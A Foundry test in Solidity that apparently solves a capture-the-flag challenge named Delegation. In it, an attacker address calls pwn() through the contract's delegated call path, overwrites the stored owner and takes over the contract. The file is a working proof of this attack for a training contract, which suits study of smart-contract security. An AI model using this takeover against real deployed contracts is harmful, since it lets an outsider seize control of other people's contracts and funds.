//SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Test, console2} from "forge-std/Test.sol";
import {Delegation, Delegate} from "../Delegation.sol";

contract DelegationTest is Test {
    Delegation delegation;
    Delegate delegate;
    address owner = makeAddr("owner");
    address attacker = makeAddr("attacker");
    // Use the delegate contract to overWrite the owner variable of the delegation contract, to claimOwnership
    function setUp() public {
        delegate = new Delegate(owner);

        vm.prank(owner);
        delegation = new Delegation(address(delegate));
        assertEq(delegation.owner(), owner);
    }
    function test_Challenge6_Passed() public {
        claimOwnership();
    }
    function claimOwnership() public {
        vm.prank(attacker);
        (bool success, ) = address(delegation).call(abi.encodeCall(Delegate.pwn, ()));
        require(success, "ClaimOwnership Failed");

        assertEq(delegation.owner(), attacker);
    }

}